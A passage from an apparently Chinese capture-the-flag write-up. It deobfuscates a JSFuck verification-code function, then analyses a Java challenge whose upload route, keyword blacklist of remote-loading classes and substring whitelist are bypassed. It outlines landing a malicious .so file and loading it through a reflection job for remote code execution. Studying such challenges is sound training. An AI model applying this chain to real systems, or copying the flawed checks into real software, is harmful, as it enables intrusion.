[]+[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]])
+</span></span><span class="line"><span class="cl">        const _0x2 = atob(&#34;Mm9aNQ==&#34;);
+</span></span><span class="line"><span class="cl">        const secretCode = _0x1 + _0x2;
+</span></span><span class="line"><span class="cl">        return secretCode;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">};
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 导出模块（如果需要）
+</span></span><span class="line"><span class="cl">if (typeof module !== &#39;undefined&#39; &amp;&amp; module.exports) {
+</span></span><span class="line"><span class="cl">    module.exports = systemModule;
+</span></span><span class="line"><span class="cl">} </span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>这里定义了一个函数，validateCode 功能是将 JS 混淆的密文解密，和另外 base64 解密的密文拼接成 secretCode 并返回
+直接调用该函数发现报错，没有被定义，它并不是一个全局函数
+<figure>
+  <img src="file-20250806095751039.png" alt="" loading="lazy"></figure>
+
+将其关键段取出，自定义一个函数并 JS 执行</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">var a = function() {
+</span></span><span class="line"><span class="cl">  const _0x1 = [][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+!+[]]+(!![]+[])[+[]]])[(![]+[])[+!+[]]+(!![]+[])[+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]](+[![]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]])
+</span></span><span class="line"><span class="cl">  const _0x2 = atob(&#34;Mm9aNQ==&#34;);
+</span></span><span class="line"><span class="cl">  const secretCode = _0x1 + _0x2;
+</span></span><span class="line"><span class="cl">  return secretCode;
+</span></span><span class="line"><span class="cl">};
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">console.log(a());</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250806100503480.png" alt="" loading="lazy"></figure>
+
+拿到验证码，直接修改 step=3，拿到 flag
+<figure>
+  <img src="file-20250806095917119.png" alt="" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="jaba_ez"><span>jaba_ez</span>
+  <a href="#jaba_ez" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>一道 java 题，下载附件反编译，定位 Web 控制器
+<figure>
+  <img src="file-20250806223338477.png" alt="" loading="lazy"></figure>
+
+黑白名单如下，不包含 java.lang.System、System.load</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">JOB_BLACKLIST = new String[] { &#34;java.net.URL&#34;, &#34;javax.naming.InitialContext&#34;, &#34;org.yaml.snakeyaml&#34;, &#34;org.springframework&#34;, &#34;org.apache&#34;, &#34;rmi&#34;, &#34;ldap&#34;, &#34;ldaps&#34;, &#34;http&#34;, &#34;https&#34; };</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>看到白名单</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">JOB_WHITELIST = new String[] { &#34;com.jabaez.FLAG&#34; };</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>先看 upload 路由，直接获取 file.getOriginalFilename() 上传文件名，去掉任何路径前缀，只保留最后一段，并进行了简单的黑名单校验 <code>.. / \ .</code>，然后进行 CanonicalPath 强校验，最后保存文件。没有对文件内容做校验、文件后缀名未校验，同时 Spring 的 MultipartFile 允许用户自定义 Content-Type，几乎毫无阻挡</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">@PostMapping({ &#34;/upload&#34; })
+</span></span><span class="line"><span class="cl">public Map&lt;String, String&gt; uploadFile(@RequestParam(&#34;file&#34;) MultipartFile file) {
+</span></span><span class="line"><span class="cl">    final Map&lt;String, String&gt; result = new HashMap&lt;String, String&gt;();
+</span></span><span class="line"><span class="cl">    try {
+</span></span><span class="line"><span class="cl">        // 1. 定义并确保上传目录存在
+</span></span><span class="line"><span class="cl">        final String uploadDir = &#34;/tmp/uploads/&#34;;
+</span></span><span class="line"><span class="cl">        final File dir = new File(uploadDir);
+</span></span><span class="line"><span class="cl">        if (!dir.exists()) {
+</span></span><span class="line"><span class="cl">            dir.mkdirs();
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        // 2. 获取原始文件名
+</span></span><span class="line"><span class="cl">        final String originalFilename = file.getOriginalFilename();
+</span></span><span class="line"><span class="cl">        if (originalFilename == null) {
+</span></span><span class="line"><span class="cl">            result.put(&#34;status&#34;, &#34;error&#34;);
+</span></span><span class="line"><span class="cl">            result.put(&#34;message&#34;, &#34;文件名为空&#34;);
+</span></span><span class="line"><span class="cl">            return result;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        // 3. 规范化文件名，去除客户端路径
+</span></span><span class="line"><span class="cl">        final String filename = new File(originalFilename).getName();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        // 4. 简单的黑名单式文件名校验
+</span></span><span class="line"><span class="cl">        if (filename.contains(&#34;..&#34;)
+</span></span><span class="line"><span class="cl">            || filename.contains(&#34;/&#34;)
+</span></span><span class="line"><span class="cl">            || filename.contains(&#34;\\&#34;)
+</span></span><span class="line"><span class="cl">            || filename.startsWith(&#34;.&#34;)) {
+</span></span><span class="line"><span class="cl">            result.put(&#34;status&#34;, &#34;error&#34;);
+</span></span><span class="line"><span class="cl">            result.put(&#34;message&#34;, &#34;非法文件名&#34;);
+</span></span><span class="line"><span class="cl">            return result;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        // 5. 进一步校验：使用 CanonicalPath 防止绕过
+</span></span><span class="line"><span class="cl">        final File dest = new File(uploadDir + filename);
+</span></span><span class="line"><span class="cl">        final String uploadPathCanonical = new File(uploadDir).getCanonicalPath();
+</span></span><span class="line"><span class="cl">        final String destCanonical      = dest.getCanonicalPath();
+</span></span><span class="line"><span class="cl">        if (!destCanonical.startsWith(uploadPathCanonical + File.separator)) {
+</span></span><span class="line"><span class="cl">            result.put(&#34;status&#34;, &#34;error&#34;);
+</span></span><span class="line"><span class="cl">            result.put(&#34;message&#34;, &#34;非法文件路径&#34;);
+</span></span><span class="line"><span class="cl">            return result;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        // 6. 真正保存文件
+</span></span><span class="line"><span class="cl">        file.transferTo(dest);
+</span></span><span class="line"><span class="cl">        // 7. 返回结果
+</span></span><span class="line"><span class="cl">        result.put(&#34;status&#34;, &#34;success&#34;);
+</span></span><span class="line"><span class="cl">        result.put(&#34;path&#34;,   dest.getAbsolutePath());
+</span></span><span class="line"><span class="cl">        result.put(&#34;message&#34;,&#34;文件上传成功&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    catch (Exception e) {
+</span></span><span class="line"><span class="cl">        result.put(&#34;status&#34;, &#34;error&#34;);
+</span></span><span class="line"><span class="cl">        result.put(&#34;message&#34;, e.getMessage());
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    return result;
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>/job/add，这是一个任务添加的功能路由，先做了黑名单检测，用到上面提到的黑名单列表，禁止常见的远程加载、网络调用、框架关键字，如
+<code>java.net.URL</code>, <code>javax.naming.InitialContext</code>, <code>org.springframework</code>, <code>http</code>, <code>ldap</code> 等，然后是白名单检验，只允许调用 <code>com.jabaez.FLAG</code> 类</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">@PostMapping({ &#34;/job/add&#34; })
+</span></span><span class="line"><span class="cl">public Map&lt;String, Object&gt; addJob(@RequestBody final VulnController.ScheduledJob job) {
+</span></span><span class="line"><span class="cl">	final Map&lt;String, Object&gt; result = new HashMap&lt;String, Object&gt;();
+</span></span><span class="line"><span class="cl">	if (this.containsBlacklist(job.getInvokeTarget())) {
+</span></span><span class="line"><span class="cl">		result.put(&#34;status&#34;, &#34;error&#34;);
+</span></span><span class="line"><span class="cl">		result.put(&#34;message&#34;, &#34;\u5305\u542b\u975e\u6cd5\u5b57\u7b26&#34;);
+</span></span><span class="line"><span class="cl">		return result;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">	if (!this.containsWhitelist(job.getInvokeTarget())) {
+</span></span><span class="line"><span class="cl">		result.put(&#34;status&#34;, &#34;error&#34;);
+</span></span><span class="line"><span class="cl">		result.put(&#34;message&#34;, &#34;\u76ee\u6807\u4e0d\u5728\u767d\u540d\u5355\u4e2d&#34;);
+</span></span><span class="line"><span class="cl">		return result;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">	VulnController.jobs.put(job.getJobName(), job);
+</span></span><span class="line"><span class="cl">	result.put(&#34;status&#34;, &#34;success&#34;);
+</span></span><span class="line"><span class="cl">	result.put(&#34;message&#34;, &#34;\u4efb\u52a1\u6dfb\u52a0\u6210\u529f&#34;);
+</span></span><span class="line"><span class="cl">	result.put(&#34;jobId&#34;, job.getJobName());
+</span></span><span class="line"><span class="cl">	return result;
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>但这里明显存在问题，只做子串判断，并不校验 invokeTarget 的开头或分隔符，任何包含该子串的位置都通过，当白名单校验通过后，就会 jobs.put 将任务存储进整个程序生命周期。</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">private boolean containsWhitelist(String str) {
+</span></span><span class="line"><span class="cl">  if (str == null) return false;
+</span></span><span class="line"><span class="cl">  for (String item : JOB_WHITELIST) {
+</span></span><span class="line"><span class="cl">    if (str.contains(item)) {
+</span></span><span class="line"><span class="cl">      return true;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  return false;
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>最后是与任务添加息息相关的任务加载运行，它调用私有方法 invokeMethod(String invokeTarget) 解析出类名、方法名及参数，并使用反射执行。这里调用后，就直接触发反射任务，执行 invokeTarget 了。</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">@PostMapping({ &#34;/job/run/{jobName}&#34; })
+</span></span><span class="line"><span class="cl">public Map&lt;String, Object&gt; runJob(@PathVariable final String jobName) {
+</span></span><span class="line"><span class="cl">	final Map&lt;String, Object&gt; result = new HashMap&lt;String, Object&gt;();
+</span></span><span class="line"><span class="cl">	final VulnController.ScheduledJob job = VulnController.jobs.get(jobName);
+</span></span><span class="line"><span class="cl">	if (job == null) {
+</span></span><span class="line"><span class="cl">		result.put(&#34;status&#34;, &#34;error&#34;);
+</span></span><span class="line"><span class="cl">		result.put(&#34;message&#34;, &#34;\u4efb\u52a1\u4e0d\u5b58\u5728&#34;);
+</span></span><span class="line"><span class="cl">		return result;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">	try {
+</span></span><span class="line"><span class="cl">		this.invokeMethod(job.getInvokeTarget());
+</span></span><span class="line"><span class="cl">		result.put(&#34;status&#34;, &#34;success&#34;);
+</span></span><span class="line"><span class="cl">		result.put(&#34;message&#34;, &#34;\u4efb\u52a1\u6267\u884c\u6210\u529f&#34;);
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">	catch (Exception e) {
+</span></span><span class="line"><span class="cl">		result.put(&#34;status&#34;, &#34;error&#34;);
+</span></span><span class="line"><span class="cl">		result.put(&#34;message&#34;, e.getMessage());
+</span></span><span class="line"><span class="cl">		result.put(&#34;stackTrace&#34;, e.getStackTrace()[0].toString());
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">	return result;
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>因此思路就有了，路由这边逻辑都没什么特别绕的，先利用上传接口将恶意 .so 动态库落地，通过注册反射任务并运行，然后 System.load() 会将动态库映射进进程地址空间，自动执行库里的初始化函数，完成 RCE。
+编写恶意 JNI 库，编译生成 .so 文件</p>
